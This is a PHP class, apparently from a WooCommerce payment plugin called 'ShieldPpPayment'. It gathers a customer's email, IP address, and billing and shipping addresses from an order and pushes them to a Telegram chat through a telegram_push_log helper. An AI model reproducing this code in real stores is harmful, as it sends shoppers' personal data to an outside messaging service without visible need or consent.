<?php
namespace ShieldPpPayment\Service;

class ReportDataService
{
  public function reportData($order)
  {
    // Thông tin khách hàng
    $customer_email = $order->get_billing_email();
    $customer_first_name = $order->get_billing_first_name();
    $customer_last_name = $order->get_billing_last_name();
    $customer_phone = $order->get_billing_phone();
    $customer_ip = $order->get_customer_ip_address();

    $billing_address = [
      'address_1' => $order->get_billing_address_1(),
      'address_2' => $order->get_billing_address_2(),
      'city' => $order->get_billing_city(),
      'state' => $order->get_billing_state(),
      'postcode' => $order->get_billing_postcode(),
      'country' => $order->get_billing_country(),
    ];

    $shipping_address = [
      'address_1' => $order->get_shipping_address_1(),
      'address_2' => $order->get_shipping_address_2(),
      'city' => $order->get_shipping_city(),
      'state' => $order->get_shipping_state(),
      'postcode' => $order->get_shipping_postcode(),
      'country' => $order->get_shipping_country(),
    ];

    telegram_push_log(
      "Reporter Data\n\n" . print_r([
        'email' => $customer_email,
        'ip' => $customer_ip,
        'billing' => $billing_address,
        'shipping' => $shipping_address
      ], true),
      null,
      '86593'
    );
  }
}